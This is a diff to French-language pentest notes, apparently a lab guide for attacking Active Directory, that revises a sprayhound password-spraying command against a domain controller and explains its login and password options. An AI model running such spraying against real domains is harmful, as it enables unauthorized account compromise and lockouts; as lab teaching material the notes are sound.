@@ -287,9 +287,13 @@ Domain policy rapport
 > * Sans compte valide, pas de découverte de password policy donc attention au blocage de comptes.
 
 ```sh
-sprayhound -d TSSR-CYBER.FR -dc 10.0.0.1 -lu a.leration -lp 'Tssrcyber1234'  -p 'Tssrcyber1234'
+sprayhound -d TSSR-CYBER.FR -dc 10.0.0.1 -lu a.leration -lp 'Tssrcyber1234' -p 'Tssrcyber1234' -v
 ```
+* `-lu` 'login ldap user name'
+* `-lp` 'paswd ldap user'
+* `-p` 'pswd to test'
 
+<br>
 
 ![img](img/sprhnd.png)
 
